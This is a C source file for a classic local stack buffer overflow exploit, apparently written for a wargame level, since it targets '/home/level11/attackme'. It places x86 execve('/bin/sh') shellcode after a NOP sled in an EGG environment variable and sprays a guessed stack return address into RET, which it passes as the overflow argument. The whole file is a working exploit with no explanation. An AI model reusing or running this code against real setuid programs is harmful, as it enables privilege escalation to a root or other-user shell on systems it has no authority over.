#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xca\x89\xe3\x52\x53\x89\xe1\x89\xd0\xb0\x0b\xcd\x80";


unsigned long get_esp(void)
{
        __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[])
{
        char *buff, *ptr, *egg;
        long *addr_ptr, addr;
        int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
        int i, eggsize=DEFAULT_EGG_SIZE;

        if (argc > 1) bsize = atoi(argv[1]);
        if (argc > 2) offset = atoi(argv[2]);
        if (argc > 3) eggsize = atoi(argv[3]);


        if (!(buff = malloc(bsize))) {
                printf("Can't allocate memory.\n");
                exit(0);
        }
        if (!(egg = malloc(eggsize))) {
                printf("Can't allocate memory.\n");
		exit(0);
        }
        addr = get_esp() - offset;
        printf("Using address: 0x%x\n", addr);
        printf("buff %x, egg %x\n", buff, egg);

        ptr = buff;
        addr_ptr = (long *) ptr;
        for (i = 0; i < bsize; i+=4)
                *(addr_ptr++) = addr;
        ptr = egg;
        for(i = 0; i < eggsize - strlen(shellcode) - 1; i++)
                *(ptr++) = NOP;
        for(i = 0; i < strlen(shellcode); i++)
                *(ptr++) = shellcode[i];
        buff[bsize - 1] = '\0';
        egg[eggsize - 1] = '\0';
        memcpy(egg,"EGG=",4);
        putenv(egg);
        memcpy(buff,"RET=",4);
        putenv(buff);
        execl("/home/level11/attackme", "attackme", buff, 0);
}

